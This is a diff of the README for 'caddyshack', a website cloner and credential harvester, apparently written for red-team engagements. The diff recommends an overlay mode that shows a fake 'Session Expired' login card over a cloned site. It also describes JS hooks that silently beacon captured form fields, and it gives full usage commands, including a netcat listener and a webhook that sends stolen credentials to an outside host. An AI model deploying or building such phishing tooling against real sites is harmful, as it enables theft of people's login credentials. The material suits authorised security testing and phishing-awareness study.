@@ -1,6 +1,6 @@
 # caddyshack
 
-**Website Cloner & Credential Harvester — v2.2.0**
+**Website Cloner & Credential Harvester — v2.3.0**
 
 Written by: Brennan Turner ([@BLTSEC](https://BLTSEC.COM))
 
@@ -14,10 +14,10 @@ Written by: Brennan Turner ([@BLTSEC](https://BLTSEC.COM))
 ## Features
 
 - **Native Go HTTP cloning** — no wget dependency; fetches HTML + CSS/JS/images with a modern Chrome UA
-- **Overlay mode** (`--overlay`) — strips all site JavaScript and injects a "Session Expired" login card over the blurred cloned page. No error popups, no failed API calls — just a clean credential capture form. Best option for JS-heavy targets
+- **Overlay mode** (`--overlay`, recommended) — silences site network requests and injects a "Session Expired" login card over the dimmed cloned page. Site JS still runs for proper layout rendering, but all fetch/XHR calls are silently blocked — no error popups, no failed API calls. Best option for most targets
 - **JS-driven form capture** — in default mode, injects hooks that intercept `fetch()` and `XMLHttpRequest` before site JS runs; captured fields are silently beaconed to `/capture`
 - **CSS sub-asset rewriting** — parses downloaded CSS for `url()` and `@import` references, fetches fonts/background images, and rewrites paths locally; inline `<style>` blocks and `style=""` attributes are also processed
-- **CDN-friendly asset downloading** — sends `Referer` and `Accept` headers on every asset request; failed assets fall back to their original URLs instead of producing broken local paths
+- **CDN-friendly asset downloading** — sends `Referer` and `Accept` headers on every asset request with throttled downloads and automatic 429 retry; failed assets fall back to their original URLs instead of producing broken local paths
 - **Proper form rewriting** — `golang.org/x/net/html` parser replaces all form actions with `/submit`; GET forms stay GET, POST forms stay POST
 - **HTTP or HTTPS** — auto-generates an in-memory ECDSA P-256 self-signed cert when `--tls` is set, or load your own
 - **JSON Lines logging** — each capture is one JSON object appended to a file; `jq`-friendly, survives crashes
@@ -53,18 +53,26 @@ GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o caddyshack .
 
 ## Usage
 
+### Overlay mode (recommended)
+
+```bash
+./caddyshack --url https://target.lab/login --overlay
+```
+
+Clones the target page, silences all site network requests, and injects a "Session Expired" login card over the dimmed page. The victim sees a fully styled clone of the real site behind a credential capture form. This is the recommended mode for most targets.
+
 ### Basic (HTTP)
 
 ```bash
 ./caddyshack --url https://target.lab/login --port 8080
 ```
 
-Visit `http://<your-ip>:8080` — the cloned page is served. Submitted credentials are written to `creds.json` and printed to the console.
+Visit `http://<your-ip>:8080` — the cloned page is served with form actions rewritten and JS hooks injected. Submitted credentials are written to `creds.json` and printed to the console.
 
 ### HTTPS with auto-generated certificate
 
 ```bash
-./caddyshack --url https://target.lab/login --port 8443 --tls
+./caddyshack --url https://target.lab/login --port 8443 --tls --overlay
 ```
 
 Self-signed cert is generated in memory (ECDSA P-256, 24h validity). No files written to disk.
@@ -72,13 +80,13 @@ Self-signed cert is generated in memory (ECDSA P-256, 24h validity). No files wr
 ### HTTPS with your own certificate
 
 ```bash
-./caddyshack --url https://target.lab/login --port 443 --tls --cert cert.pem --key key.pem
+./caddyshack --url https://target.lab/login --port 443 --tls --cert cert.pem --key key.pem --overlay
 ```
 
 ### Custom output file + redirect URL
 
 ```bash
-./caddyshack --url https://target.lab/login \
+./caddyshack --url https://target.lab/login --overlay \
              --output /tmp/engagement-creds.json \
              --redirect https://target.lab/dashboard
 ```
@@ -90,23 +98,15 @@ Self-signed cert is generated in memory (ECDSA P-256, 24h validity). No files wr
 nc -lk 9999
 
 # Terminal 2 — caddyshack
-./caddyshack --url https://target.lab/login --webhook http://10.10.14.1:9999
+./caddyshack --url https://target.lab/login --overlay --webhook http://10.10.14.1:9999
 ```
 
 Each form submission POSTs a JSON object to the webhook URL.
 
-### Overlay mode (recommended for JS-heavy sites)
-
-```bash
-./caddyshack --url https://target.lab/login --overlay
-```
-
-Strips all site JavaScript and injects a "Session Expired" login overlay on top of the blurred cloned page. No error popups, no failed API calls — the victim sees the real site behind a clean credential capture card.
-
 ### Verbose + clone a site with HTTPS that has a self-signed cert
 
 ```bash
-./caddyshack --url https://target.lab/login --insecure --verbose
+./caddyshack --url https://target.lab/login --insecure --verbose --overlay
 ```
 
 ---
@@ -124,7 +124,7 @@ Strips all site JavaScript and injects a "Session Expired" login overlay on top 
 | `--redirect` | target URL | URL to redirect victims after capture |
 | `--user-agent` | Chrome 133 | User-Agent used when cloning |
 | `--webhook` | | HTTP/HTTPS URL for credential POSTs |
-| `--overlay` | false | Strip site JS and inject a themed login overlay |
+| `--overlay` | false | Silence site network requests and inject a themed login overlay (recommended) |
 | `--insecure` | false | Skip TLS verification when cloning |
 | `--verbose` | false | Debug output |
 
